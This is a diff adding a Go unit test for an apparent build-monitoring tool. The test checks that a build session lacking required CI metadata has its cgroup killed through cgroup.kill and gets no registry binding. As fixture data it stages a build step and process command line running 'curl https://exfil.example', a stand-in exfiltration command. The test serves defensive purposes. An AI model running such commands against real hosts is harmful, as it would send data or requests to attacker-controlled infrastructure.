@@ -572,6 +572,78 @@ func TestCgroupJoiner_DeferredMatchGivesUpAtDeadline(t *testing.T) {
 	}
 }
 
+// TestCgroupJoiner_KillsUnauthorizedSession covers the kill-switch:
+// when the matched session was marked Unauthorized by the registry's
+// require-CI-metadata policy, the joiner must SIGKILL the cgroup via
+// cgroup.kill instead of writing a binding. No link in the index;
+// observable side effect is "1" in the cgroup.kill file (we fixture
+// it as a regular file in a tmpdir).
+func TestCgroupJoiner_KillsUnauthorizedSession(t *testing.T) {
+	root := t.TempDir()
+	reg := NewSessionRegistry(time.Minute)
+
+	// Policy: require LEITWACHT_CI_PROJECT_PATH on every session.
+	reg.SetCIRequirement(true, []string{"build-arg:LEITWACHT_CI_PROJECT_PATH"})
+
+	// Session registered WITHOUT the required key → Unauthorized.
+	reg.RegisterSession("rUnauth", time.Unix(1000, 0), map[string]string{
+		"build-arg:OTHER": "irrelevant",
+	})
+	reg.UpsertVertex("rUnauth", VertexState{
+		Digest:    "dKill",
+		Name:      "[1/1] RUN curl https://exfil.example",
+		StartedAt: time.Unix(1010, 0),
+	})
+
+	// Stage the cgroup directory the way runc would. We seed
+	// cgroup.kill as an empty regular file so the joiner can write
+	// "1" to it; in production cgroup v2's kernel API consumes the
+	// write and SIGKILLs every process in the cgroup.
+	cgroupPath := stageCgroup(t, root, "ctr-bad", 5555, "/bin/sh\x00-c\x00curl https://exfil.example\x00")
+	killFile := filepath.Join(cgroupPath, "cgroup.kill")
+	if err := os.WriteFile(killFile, nil, 0o600); err != nil {
+		t.Fatalf("stage cgroup.kill: %v", err)
+	}
+
+	source := newFakeEventSource()
+	statFn := func(_ string) (uint64, error) { return 6789, nil }
+
+	j := NewCgroupJoiner(reg, source, nil,
+		WithProcRoot(filepath.Join(root, "proc")),
+		WithStatFn(statFn),
+	)
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	done := make(chan struct{})
+	go func() {
+		_ = j.Run(ctx)
+
+		close(done)
+	}()
+
+	source.creates <- CgroupCreateEvent{ContainerID: "ctr-bad", CgroupPath: cgroupPath}
+
+	// Wait for the joiner to process. The kill writes synchronously
+	// in the joiner's goroutine, so polling the file content is the
+	// observable signal.
+	waitFor(t, time.Second, func() bool {
+		data, err := os.ReadFile(killFile)
+
+		return err == nil && string(data) == "1"
+	})
+
+	// Crucially, no binding should be in the registry — the kill
+	// path skips LinkCgroup.
+	if _, ok := reg.LookupByCgroupID(6789); ok {
+		t.Fatal("Unauthorized session wrote a binding instead of just killing")
+	}
+
+	cancel()
+	<-done
+}
+
 func TestCgroupJoiner_NoMatchSilentlyDropped(t *testing.T) {
 	root := t.TempDir()
 	reg := NewSessionRegistry(time.Minute)
